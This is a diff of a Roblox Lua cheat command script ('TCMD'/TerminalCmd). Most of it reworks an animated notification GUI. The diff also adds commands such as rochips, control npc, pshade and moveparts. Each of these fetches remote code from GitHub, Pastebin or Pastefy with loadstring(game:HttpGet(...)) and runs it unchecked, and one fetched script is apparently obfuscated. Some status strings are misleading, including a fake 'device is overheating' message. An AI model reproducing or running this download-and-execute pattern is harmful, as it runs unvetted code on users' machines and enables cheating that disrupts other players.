@@ -371,17 +371,18 @@ local function freezeGame(duration)
         -- Note: This only freezes Lua, not the physics engine
     end
     
-    print("Game unfrozen after " .. duration .. " seconds")
+    print("loaded all commands in " .. duration .. " seconds")
 end
 
 -- Call the freeze function
 freezeGame(freezeDuration)
 
 task.wait()
-
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
 
 local player = Players.LocalPlayer
 local gui = player:WaitForChild("PlayerGui")
@@ -391,225 +392,397 @@ local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "NotificationGui"
 screenGui.Parent = gui
 screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- Notification queue and active notifications table
-local notificationQueue = {}
-local activeNotifications = {}
-local notificationOffset = 0
+-- Create a sound folder in SoundService for our notification sounds
+local notificationSounds = Instance.new("Folder")
+notificationSounds.Name = "NotificationSounds"
+notificationSounds.Parent = SoundService
+
+-- Sound IDs and configurations
+local soundConfigs = {
+    NotificationAppear = {id = 3023237993, volume = 0.1},
+    NotificationDisappear = {id = 18595195017, volume = 0.1},
+    NotificationHover = {id = 7218169592, volume = 0.1},
+    NotificationClick = {id = 177266782, volume = 0.1},
+    NotificationPulse = {id = 10066936758, volume = 0.1}
+}
+-- Function to play sounds
+local function playSound(soundName)
+    local config = soundConfigs[soundName]
+    if not config then return end
+    
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://"..config.id
+    sound.Volume = config.volume
+    sound.Parent = notificationSounds
+    sound:Play()
+    
+    sound.Ended:Connect(function()
+        sound:Destroy()
+    end)
+end
 
 -- Notification function
 function showNotification(title, message, duration, color)
     duration = duration or 5
     color = color or Color3.fromRGB(0, 170, 255)
-    
-    -- Calculate position based on active notifications
-    local positionOffset = #activeNotifications * 70
-    
+
+    -- Play appear sound
+    playSound("NotificationAppear")
+
     -- Main frame
     local frame = Instance.new("Frame")
     frame.Name = "Notification"
-    frame.Size = UDim2.new(0.25, 0, 0, 0) -- Height will be auto-adjusted
-    frame.Position = UDim2.new(1, 10, 0.8, positionOffset)
+    frame.Size = UDim2.new(0.35, 0, 0, 70)
+    frame.Position = UDim2.new(1, 10, 0.85, 0)
     frame.AnchorPoint = Vector2.new(1, 0)
     frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-    frame.BackgroundTransparency = 0.3
+    frame.BackgroundTransparency = 0.8  -- Start more transparent for dramatic fade-in
     frame.BorderSizePixel = 0
-    frame.ClipsDescendants = true
-    frame.ZIndex = 2
     frame.Parent = screenGui
-    
-    -- Shadow effect
+    frame.ZIndex = 10
+    frame.ClipsDescendants = true  -- For the ripple effect
+
+    -- Shadow with initial scale for pop effect
     local shadow = Instance.new("ImageLabel")
     shadow.Name = "Shadow"
     shadow.Image = "rbxassetid://1316045217"
-    shadow.ImageColor3 = Color3.new(0, 0, 0)
-    shadow.ImageTransparency = 0.8
+    shadow.ImageTransparency = 0.9  -- Start more transparent
     shadow.ScaleType = Enum.ScaleType.Slice
     shadow.SliceCenter = Rect.new(10, 10, 118, 118)
-    shadow.Size = UDim2.new(1, 10, 1, 10)
-    shadow.Position = UDim2.new(0, -5, 0, -5)
+    shadow.Size = UDim2.new(1, 20, 1, 20)
+    shadow.Position = UDim2.new(0, -10, 0, -10)
     shadow.BackgroundTransparency = 1
-    shadow.ZIndex = 1
+    shadow.ZIndex = frame.ZIndex - 1
     shadow.Parent = frame
-    
-    -- Corner rounding
+
+    -- Rounded corners
     local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 8)
+    corner.CornerRadius = UDim.new(0, 6)
     corner.Parent = frame
-    
-    -- Accent bar
+
+    -- Accent line
     local accent = Instance.new("Frame")
     accent.Name = "Accent"
-    accent.Size = UDim2.new(0, 4, 1, -16)
-    accent.Position = UDim2.new(0, 6, 0, 8)
+    accent.Size = UDim2.new(0, 0, 0, 2)  -- Start with 0 width for animation
+    accent.Position = UDim2.new(0, 0, 0, 0)
     accent.BackgroundColor3 = color
     accent.BorderSizePixel = 0
-    accent.ZIndex = 3
-    local accentCorner = Instance.new("UICorner")
-    accentCorner.CornerRadius = UDim.new(0, 2)
-    accentCorner.Parent = accent
+    accent.ZIndex = frame.ZIndex + 1
     accent.Parent = frame
-    
-    -- Icon (optional)
-    local icon = Instance.new("ImageLabel")
-    icon.Name = "Icon"
-    icon.Size = UDim2.new(0, 20, 0, 20)
-    icon.Position = UDim2.new(0, 15, 0, 12)
-    icon.BackgroundTransparency = 1
-    icon.Image = "rbxassetid://120131404524020" -- Default info icon
-    icon.ImageColor3 = color
-    icon.ZIndex = 3
-    icon.Parent = frame
-    
-    -- Title text
+
+    -- Title with initial scale for bounce effect
     local titleLabel = Instance.new("TextLabel")
     titleLabel.Name = "Title"
-    titleLabel.Text = string.upper(title)
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    titleLabel.TextSize = 14
-    titleLabel.Font = Enum.Font.GothamBold
-    titleLabel.Size = UDim2.new(1, -50, 0, 20)
-    titleLabel.Position = UDim2.new(0, 40, 0, 10)
+    titleLabel.Text = title
+    titleLabel.TextColor3 = Color3.fromRGB(0, 255, 180)
+    titleLabel.TextTransparency = 1  -- Start invisible for fade-in
+    titleLabel.TextSize = 15
+    titleLabel.Font = Enum.Font.Code
+    titleLabel.Size = UDim2.new(1, -40, 0, 18)
+    titleLabel.Position = UDim2.new(0, 10, 0, 8)
     titleLabel.TextXAlignment = Enum.TextXAlignment.Left
     titleLabel.BackgroundTransparency = 1
-    titleLabel.ZIndex = 3
+    titleLabel.ZIndex = frame.ZIndex + 1
     titleLabel.Parent = frame
-    
-    -- Message text
+
+    -- Message
     local messageLabel = Instance.new("TextLabel")
     messageLabel.Name = "Message"
     messageLabel.Text = message
     messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
-    messageLabel.TextSize = 13
-    messageLabel.Font = Enum.Font.Gotham
-    messageLabel.TextWrapped = true
-    messageLabel.Size = UDim2.new(1, -20, 1, -40)
-    messageLabel.Position = UDim2.new(0, 15, 0, 35)
+    messageLabel.TextTransparency = 1  -- Start invisible for fade-in
+    messageLabel.TextSize = 14
+    messageLabel.Font = Enum.Font.Code
+    messageLabel.Size = UDim2.new(1, -20, 0, 35)
+    messageLabel.Position = UDim2.new(0, 10, 0, 28)
     messageLabel.TextXAlignment = Enum.TextXAlignment.Left
     messageLabel.TextYAlignment = Enum.TextYAlignment.Top
     messageLabel.BackgroundTransparency = 1
-    messageLabel.ZIndex = 3
-    messageLabel.Parent = frame    
-    messageLabel.AutomaticSize = Enum.AutomaticSize.Y
-    
-    -- Close button (X)
-    local closeButton = Instance.new("ImageButton")
+    messageLabel.ZIndex = frame.ZIndex + 1
+    messageLabel.Parent = frame
+
+    -- Close button with hover effects
+    local closeButton = Instance.new("TextButton")
     closeButton.Name = "CloseButton"
-    closeButton.Image = "rbxassetid://3926305904" -- X icon
-    closeButton.ImageRectOffset = Vector2.new(924, 724)
-    closeButton.ImageRectSize = Vector2.new(36, 36)
-    closeButton.ImageColor3 = Color3.fromRGB(150, 150, 150)
-    closeButton.Size = UDim2.new(0, 16, 0, 16)
-    closeButton.Position = UDim2.new(1, -25, 0, 12)
+    closeButton.Text = "×"
+    closeButton.TextColor3 = Color3.fromRGB(180, 180, 180)
+    closeButton.TextTransparency = 1  -- Start invisible for fade-in
+    closeButton.TextSize = 20
+    closeButton.Font = Enum.Font.Code
+    closeButton.Size = UDim2.new(0, 20, 0, 20)
+    closeButton.Position = UDim2.new(1, -25, 0, 6)
     closeButton.BackgroundTransparency = 1
-    closeButton.ZIndex = 3
+    closeButton.ZIndex = frame.ZIndex + 1
     closeButton.Parent = frame
-    
-    -- Progress bar (shows time remaining)
-    local progressBar = Instance.new("Frame")
-    progressBar.Name = "ProgressBar"
-    progressBar.Size = UDim2.new(1, 0, 0, 2)
-    progressBar.Position = UDim2.new(0, 0, 1, -2)
-    progressBar.BackgroundColor3 = color
-    progressBar.BorderSizePixel = 0
-    progressBar.ZIndex = 3
-    local progressCorner = Instance.new("UICorner")
-    progressCorner.CornerRadius = UDim.new(0, 2)
-    progressCorner.Parent = progressBar
-    progressBar.Parent = frame
-    
-    -- Calculate required height based on message
-    local textHeight = messageLabel.TextBounds.Y
-    local frameHeight = math.clamp(textHeight + 45, 60, 200)
-    frame.Size = UDim2.new(frame.Size.X.Scale, frame.Size.X.Offset, 0, frameHeight)
-    
-    -- Add to active notifications
-    table.insert(activeNotifications, frame)
-    
-    -- Animation
-    local slideIn = TweenService:Create(
-        frame,
-        TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
-        {Position = UDim2.new(1, -10, 0.8, positionOffset)}
-    )
-    
-    local slideOut = TweenService:Create(
-        frame,
-        TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
-        {Position = UDim2.new(1, 10, 0.8, positionOffset)}
-    )
-    
-    local fadeOut = TweenService:Create(
-        frame,
-        TweenInfo.new(0.2, Enum.EasingStyle.Linear),
-        {BackgroundTransparency = 1}
-    )
-    
-    -- Progress bar animation
-    local progressTween = TweenService:Create(
-        progressBar,
-        TweenInfo.new(duration - 0.3, Enum.EasingStyle.Linear),
-        {Size = UDim2.new(0, 0, 0, 2)}
-    )
-    
-    slideIn:Play()
-    progressTween:Play()
-    
-    -- Close functionality
-    local function close()
-        -- Remove from active notifications
-        for i, notification in ipairs(activeNotifications) do
-            if notification == frame then
-                table.remove(activeNotifications, i)
-                break
-            end
-        end
+
+    -- Add a subtle glow effect
+    local glow = Instance.new("ImageLabel")
+    glow.Name = "Glow"
+    glow.Image = "rbxassetid://5028857084"
+    glow.ImageColor3 = color
+    glow.ImageTransparency = 1  -- Start invisible
+    glow.ScaleType = Enum.ScaleType.Slice
+    glow.SliceCenter = Rect.new(24, 24, 24, 24)
+    glow.Size = UDim2.new(1, 40, 1, 40)
+    glow.Position = UDim2.new(0.5, -20, 0.5, -20)
+    glow.AnchorPoint = Vector2.new(0.5, 0.5)
+    glow.BackgroundTransparency = 1
+    glow.ZIndex = frame.ZIndex - 1
+    glow.Parent = frame
+
+    -- Add a ripple effect for when the notification appears
+    local ripple = Instance.new("Frame")
+    ripple.Name = "Ripple"
+    ripple.Size = UDim2.new(0, 0, 0, 0)
+    ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ripple.AnchorPoint = Vector2.new(0.5, 0.5)
+    ripple.BackgroundColor3 = Color3.new(1, 1, 1)
+    ripple.BackgroundTransparency = 0.9
+    ripple.ZIndex = frame.ZIndex + 2
+    local rippleCorner = Instance.new("UICorner")
+    rippleCorner.CornerRadius = UDim.new(1, 0)
+    rippleCorner.Parent = ripple
+    ripple.Parent = frame
+
+    -- Pulse animation for accent line
+    local pulseConnection
+    local function startPulse()
+        playSound("NotificationPulse")
         
-        -- Update positions of remaining notifications
-        for i, notification in ipairs(activeNotifications) do
-            local newPosition = UDim2.new(1, -10, 0.8, (i-1) * 70)
-            TweenService:Create(
-                notification,
-                TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
-                {Position = newPosition}
-            ):Play()
-        end
-        
-        slideOut:Play()
-        slideOut.Completed:Wait()
-        frame:Destroy()
+        local targetColor = Color3.new(color.R * 1.2, color.G * 1.2, color.B * 1.2)
+        local pulseIn = TweenService:Create(accent, TweenInfo.new(0.8, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut, -1, true), {
+            BackgroundColor3 = targetColor
+        })
+        pulseIn:Play()
     end
+
+    -- Slide in animation with bounce
+    local slideIn = TweenService:Create(frame, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Position = UDim2.new(1, -10, 0.85, 0),
+        BackgroundTransparency = 0.1
+    })
     
-    closeButton.MouseButton1Click:Connect(close)
-    closeButton.MouseEnter:Connect(function()
-        TweenService:Create(closeButton, TweenInfo.new(0.1), {ImageColor3 = Color3.fromRGB(255, 255, 255)}):Play()
-    end)
-    closeButton.MouseLeave:Connect(function()
-        TweenService:Create(closeButton, TweenInfo.new(0.1), {ImageColor3 = Color3.fromRGB(150, 150, 150)}):Play()
-    end)
+    -- Pop effect for shadow
+    local shadowPop = TweenService:Create(shadow, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        ImageTransparency = 0.6,
+        Size = UDim2.new(1, 30, 1, 30),
+        Position = UDim2.new(0, -15, 0, -15)
+    })
     
-    -- Hover effects
+    -- Glow effect
+    local glowFadeIn = TweenService:Create(glow, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {
+        ImageTransparency = 0.8
+    })
+    
+    -- Ripple effect animation
+    local rippleExpand = TweenService:Create(ripple, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {
+        Size = UDim2.new(2, 0, 2, 0),
+        BackgroundTransparency = 1
+    })
+    
+    -- Fade in content with slight delay between elements
+    local fadeIn = TweenService:Create(titleLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+        TextTransparency = 0
+    })
+    local fadeIn2 = TweenService:Create(messageLabel, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+        TextTransparency = 0
+    })
+    local fadeIn3 = TweenService:Create(closeButton, TweenInfo.new(0.4, Enum.EasingStyle.Quad), {
+        TextTransparency = 0
+    })
+    
+    -- Accent line grow animation with overshoot
+    local accentGrow = TweenService:Create(accent, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
+        Size = UDim2.new(1, 0, 0, 2)
+    })
+    
+    -- Frame fade in with slight scale effect
+    local frameFadeIn = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
+        BackgroundTransparency = 0.1
+    })
+
+    -- Play animations in sequence with staggered timing
+    slideIn:Play()
+    shadowPop:Play()
+    rippleExpand:Play()
+    glowFadeIn:Play()
+    
+    -- Start ripple from center
+    ripple.Position = UDim2.new(0.5, 0, 0.5, 0)
+    ripple.AnchorPoint = Vector2.new(0.5, 0.5)
+    
+    task.wait(0.1)
+    accentGrow:Play()
+    frameFadeIn:Play()
+    
+    task.wait(0.15)
+    fadeIn:Play()
+    
+    task.wait(0.05)
+    fadeIn2:Play()
+    
+    task.wait(0.05)
+    fadeIn3:Play()
+    
+    -- Start pulse animation after everything is shown
+    task.delay(0.6, startPulse)
+    
+    -- Hover effect for the entire notification
+    local hoverScale = 1.02
     frame.MouseEnter:Connect(function()
-        TweenService:Create(frame, TweenInfo.new(0.1), {BackgroundTransparency = 0.1}):Play()
+        playSound("NotificationHover")
+        
+        TweenService:Create(frame, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.35 * hoverScale, 0, 0, 70 * hoverScale)
+        }):Play()
+        TweenService:Create(shadow, TweenInfo.new(0.2), {
+            Size = UDim2.new(1, 30 * hoverScale, 1, 30 * hoverScale),
+            Position = UDim2.new(0, -15 * hoverScale, 0, -15 * hoverScale)
+        }):Play()
     end)
     
     frame.MouseLeave:Connect(function()
-        TweenService:Create(frame, TweenInfo.new(0.1), {BackgroundTransparency = 0.3}):Play()
+        TweenService:Create(frame, TweenInfo.new(0.2), {
+            Size = UDim2.new(0.35, 0, 0, 70)
+        }):Play()
+        TweenService:Create(shadow, TweenInfo.new(0.2), {
+            Size = UDim2.new(1, 30, 1, 30),
+            Position = UDim2.new(0, -15, 0, -15)
+        }):Play()
+    end)
+
+    -- Close functionality with animations
+    local closing = false
+    local function close()
+        if closing then return end
+        closing = true
+        
+        playSound("NotificationDisappear")
+        
+        -- Stop pulse animation
+        if pulseConnection then
+            pulseConnection:Disconnect()
+        end
+        
+        -- Create a new ripple for close effect
+        local closeRipple = ripple:Clone()
+        closeRipple.BackgroundTransparency = 0.95
+        closeRipple.Size = UDim2.new(0, 0, 0, 0)
+        closeRipple.Position = UDim2.new(
+            UserInputService:GetMouseLocation().X / frame.AbsoluteSize.X,
+            0,
+            (UserInputService:GetMouseLocation().Y - frame.AbsolutePosition.Y) / frame.AbsoluteSize.Y,
+            0
+        )
+        closeRipple.AnchorPoint = Vector2.new(0.5, 0.5)
+        closeRipple.Parent = frame
+        
+        local rippleOut = TweenService:Create(closeRipple, TweenInfo.new(0.6, Enum.EasingStyle.Quad), {
+            Size = UDim2.new(2, 0, 2, 0),
+            BackgroundTransparency = 1
+        })
+        rippleOut:Play()
+        rippleOut.Completed:Connect(function()
+            closeRipple:Destroy()
+        end)
+        
+        -- Shake effect when closing
+        local shakeOffset = 5
+        for i = 1, 3 do
+            TweenService:Create(frame, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {
+                Position = UDim2.new(1, -10 + shakeOffset, 0.85, 0)
+            }):Play()
+            task.wait(0.05)
+            TweenService:Create(frame, TweenInfo.new(0.05, Enum.EasingStyle.Linear), {
+                Position = UDim2.new(1, -10 - shakeOffset, 0.85, 0)
+            }):Play()
+            task.wait(0.05)
+            shakeOffset = shakeOffset * 0.6  -- Reduce shake amount each time
+        end
+        
+        -- Fade out content first
+        local fadeOut = TweenService:Create(titleLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            TextTransparency = 1
+        })
+        local fadeOut2 = TweenService:Create(messageLabel, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            TextTransparency = 1
+        })
+        local fadeOut3 = TweenService:Create(closeButton, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            TextTransparency = 1
+        })
+        
+        fadeOut:Play()
+        fadeOut2:Play()
+        fadeOut3:Play()
+        
+        -- Then slide out the frame
+        task.wait(0.15)
+        local slideOut = TweenService:Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
+            Position = UDim2.new(1, 10, 0.85, 0),
+            BackgroundTransparency = 0.8
+        })
+        
+        -- Shrink accent line
+        local accentShrink = TweenService:Create(accent, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
+            Size = UDim2.new(0, 0, 0, 2)
+        })
+        
+        -- Shadow fade out and shrink
+        local shadowFadeOut = TweenService:Create(shadow, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
+            ImageTransparency = 0.9,
+            Size = UDim2.new(1, 20, 1, 20),
+            Position = UDim2.new(0, -10, 0, -10)
+        })
+        
+        -- Glow fade out
+        local glowFadeOut = TweenService:Create(glow, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {
+            ImageTransparency = 1
+        })
+        
+        slideOut:Play()
+        accentShrink:Play()
+        shadowFadeOut:Play()
+        glowFadeOut:Play()
+        
+        slideOut.Completed:Wait()
+        frame:Destroy()
+    end
+
+    closeButton.MouseButton1Click:Connect(function()
+        playSound("NotificationClick")
+        close()
     end)
     
+    -- Enhanced close button hover effects
+    closeButton.MouseEnter:Connect(function()
+        playSound("NotificationHover")
+        
+        TweenService:Create(closeButton, TweenInfo.new(0.1), {
+            TextColor3 = Color3.new(1, 1, 1),
+            Rotation = 90,
+            TextSize = 22
+        }):Play()
+    end)
+    
+    closeButton.MouseLeave:Connect(function()
+        TweenService:Create(closeButton, TweenInfo.new(0.1), {
+            TextColor3 = Color3.fromRGB(180, 180, 180),
+            Rotation = 0,
+            TextSize = 20
+        }):Play()
+    end)
+
     -- Auto-close after duration
     task.delay(duration, function()
-        if frame and frame.Parent then
-            close()
-        end
+        close()
     end)
 end
 
--- Example usage:
-showNotification("LOADING", "79 commands has been loaded", 3, Color3.fromRGB(0, 200, 100))
-task.wait(1.5)
-showNotification("WELCOME", "Welcome to TCMD! Enjoy >:33", 8, Color3.fromRGB(0, 170, 255))
+-- Example usage with different animations
+showNotification("System Alert", "88 Cmds Are Loaded", 3, Color3.fromRGB(0, 200, 100))
+task.wait(4)
+showNotification("Welcome To TCMD >:33", "type in [cmds] btw :3", 3, Color3.fromRGB(0, 170, 255))
 task.wait()
 pcall(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Credit-obfuscated-lol/refs/heads/main/OBFCredit", true))()
@@ -632,156 +805,6 @@ local function debugPrint(message)
         print(message)
     end
 end
-
-debugPrint("🔄 [Debug] Initializing playNotificationSound function")
-local function playNotificationSound()
-    debugPrint("🔄 [Debug] Creating sound instance for notification")
-    local sound = Instance.new("Sound")
-    sound.SoundId = SoundId
-    sound.Volume = volume
-    sound.Parent = game:GetService("SoundService")
-    sound:Play()
-    sound.Ended:Connect(function()
-        debugPrint("🔄 [Debug] Notification sound ended, destroying instance")
-        sound:Destroy()
-    end)
-end
-
-debugPrint("🔄 [Debug] Initializing updateNotificationPositions function")
-local function updateNotificationPositions()
-    debugPrint("🔄 [Debug] Updating notification positions")
-    for i, frame in ipairs(notifications) do
-        local targetPos = UDim2.new(0, 20, 0, 20 + ((i - 1) * 70)) -- Adjusts stacking
-        debugPrint(string.format("🔄 [Debug] Moving notification to position %d", i))
-        game:GetService("TweenService"):Create(frame, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = targetPos}):Play()
-    end
-end
-
-debugPrint("🔄 [Debug] Initializing createNotification function")
-local function createNotification(message, duration, imageAssetId)
-    debugPrint("🔄 [Debug] Playing notification sound")
-    local player = game.Players.LocalPlayer
-    local playerGui = player:WaitForChild("PlayerGui")
-
-    playNotificationSound()
-
-    local screenGui = playerGui:FindFirstChild("NotificationGui") or Instance.new("ScreenGui")
-    screenGui.Name = "NotificationGui"
-    screenGui.Parent = playerGui
-
-    local notificationFrame = Instance.new("Frame")
-    notificationFrame.Size = UDim2.new(0, 220, 0, 60)
-    notificationFrame.Position = UDim2.new(0, -200, 0, 20) -- Start off-screen
-    notificationFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
-    notificationFrame.BackgroundTransparency = 0.2
-    notificationFrame.BorderSizePixel = 1
-    notificationFrame.BorderColor3 = Color3.fromRGB(128, 128, 128)
-    notificationFrame.ClipsDescendants = true
-    notificationFrame.Parent = screenGui
-
-    local uiCorner = Instance.new("UICorner")
-    uiCorner.CornerRadius = UDim.new(0, 19)
-    uiCorner.Parent = notificationFrame
-
-    local notificationText = Instance.new("TextLabel")
-    notificationText.Size = UDim2.new(1, 0, 1, 0)
-    notificationText.Text = message
-    notificationText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    notificationText.TextSize = 20
-    notificationText.TextWrapped = true
-    notificationText.BackgroundTransparency = 1
-    notificationText.Font = Enum.Font.GothamBold
-    notificationText.Parent = notificationFrame
-
-    local durationBar = Instance.new("Frame")
-    durationBar.Size = UDim2.new(1, 0, 0.1, 0)
-    durationBar.Position = UDim2.new(0, 9, 0.8, 0)
-    durationBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
-    durationBar.BorderSizePixel = 0
-    durationBar.Parent = notificationFrame
-
-    local barCorner = Instance.new("UICorner")
-    barCorner.CornerRadius = UDim.new(0, 5)
-    barCorner.Parent = durationBar
-
-    local imageLabel = Instance.new("ImageLabel")
-    imageLabel.Size = UDim2.new(0, 20, 0, 20)
-    imageLabel.Position = UDim2.new(1, -213, 0, 5)
-    imageLabel.BackgroundTransparency = 1
-    imageLabel.Image = imageAssetId
-    imageLabel.Parent = notificationFrame
-
-    table.insert(notifications, notificationFrame)
-    updateNotificationPositions()
-
-    local tweenService = game:GetService("TweenService")
-    local tweenIn = tweenService:Create(notificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0, 20, 0, 20 + ((#notifications - 1) * 70))})
-    tweenIn:Play()
-
-    local durationTween = tweenService:Create(durationBar, TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Size = UDim2.new(0, 0, 0.1, 0)})
-    durationTween:Play()
-
-    local function closeNotification()
-        debugPrint("🔄 [Debug] Closing notification")
-        local tweenOut = tweenService:Create(notificationFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Position = UDim2.new(0, -200, 0, notificationFrame.Position.Y.Offset)})
-        tweenOut:Play()
-        tweenOut.Completed:Wait()
-
-        for i, frame in ipairs(notifications) do
-            if frame == notificationFrame then
-                table.remove(notifications, i)
-                break
-            end
-        end
-
-        updateNotificationPositions()
-        notificationFrame:Destroy()
-    end
-
-    notificationFrame.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.Touch or input.UserInputType == Enum.UserInputType.MouseButton1 then
-            closeNotification()
-        end
-    end)
-
-    task.spawn(function()
-        task.wait(duration)
-        closeNotification()
-    end)
-end
-
-debugPrint("🔄 [Debug] Initializing playSound function")
-local function playSound(soundId)
-    debugPrint("🔄 [Debug] Playing sound with SoundId: "..soundId)
-    local sound = Instance.new("Sound")
-    sound.SoundId = soundId
-    sound.Parent = workspace
-    sound:Play()
-    sound.Ended:Connect(function()
-        debugPrint("🔄 [Debug] Sound ended, destroying instance")
-        sound:Destroy()
-    end)
-end
-
-debugPrint("🔄 [Debug] Initializing checkForError function")
-local function checkForError()
-    debugPrint("🔄 [Debug] Checking for errors")
-    local success, errorMessage = pcall(function()
-        -- Place code that could potentially error here
-    end)
-
-    if success then
-        print("✅ [Status] No Error Detected.")
-    else
-        print("⚠️ [Warning] Error Detected: " .. errorMessage)
-        createNotification("⚠️ Error Detected: " .. errorMessage, 5, "rbxassetid://1234567890") -- Replace with an appropriate image asset ID
-    end
-end
-
--- Example Usage
-debugPrint("🔄 [Debug] Running example usage")
-checkForError()
-createNotification("Type In <<cmds>>", 5, "rbxassetid://132036502772790")
 
 print(" ၊၊||၊|။||||။‌‌‌‌‌၊|• TerminalCmd •၊၊||၊|။||||။‌‌‌‌‌၊|")
 task.wait()
@@ -2034,7 +2057,12 @@ local commands = {
     "winobby",
     "floatparts",
     "============",
-    "energize",
+    "afem (req, R15)",
+    "pshade",
+    "rochips panel/rc",
+    "control npc/cn",
+    "moveparts/mp",
+    "energize/ee",
     "hugtool",
     "drawchat",
     "============",
@@ -3342,8 +3370,6 @@ function EmitterOff()
     end
 end
 
-EmitterOn()
-
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
@@ -4127,7 +4153,98 @@ end
                     result = "Execution error:\n"
                 end
             else
-                result = "Started AntiFling:\n"
+                result = "Stoppes Flying:\n"
+            end
+        elseif command:sub(1, 15) == "rochips" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/load/refs/heads/main/rcloader"))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "RoChipsPanelStarted:\nGo Sub To @Im_Patrick"
+            end
+        elseif command:sub(1, 15) == "rc" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/load/refs/heads/main/rcloader"))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "RoChipsPanelStarted:\nGo Sub To @Im_Patrick"
+            end
+        elseif command:sub(1, 15) == "control npc" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty38.lua"))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "ControlNpcStarted:\nGo Sub To @Im_Patrick"
+            end
+        elseif command:sub(1, 15) == "cn" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/randomstring0/Qwerty/refs/heads/main/qwerty38.lua"))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "ControlNpcStarted:\nGo Sub To @Im_Patrick"
+            end
+        elseif command:sub(1, 15) == "pshade" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet('https://pastebin.com/raw/3Rnd9rHf'))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "your device is overheating at (109.4°F):\nGo Sub To @Im_Patrick"
+            end
+        elseif command:sub(1, 15) == "moveparts" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://pastefy.app/Vcuyg09O/raw", true))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "SMovePartsStarted:\nGo Sub To @Im_Patrick"
+            end
+        elseif command:sub(1, 15) == "mp" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://pastefy.app/Vcuyg09O/raw", true))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "Started MoveParts:\n"
             end
         elseif command:sub(1, 5) == "nofog" then -- removes or pushes fog far away
             local atmosphere = game:GetService("Lighting"):FindFirstChildOfClass("Atmosphere")
@@ -4241,7 +4358,7 @@ end
             end
         elseif command:sub(1, 15) == "energize" then
             local luaCode = command:sub(16)
-            local func, err = loadstring(game:HttpGet(('https://pastebin.com/raw/1p6xnBNf'),true))()
+            local func, err = loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Energize-10408"))()
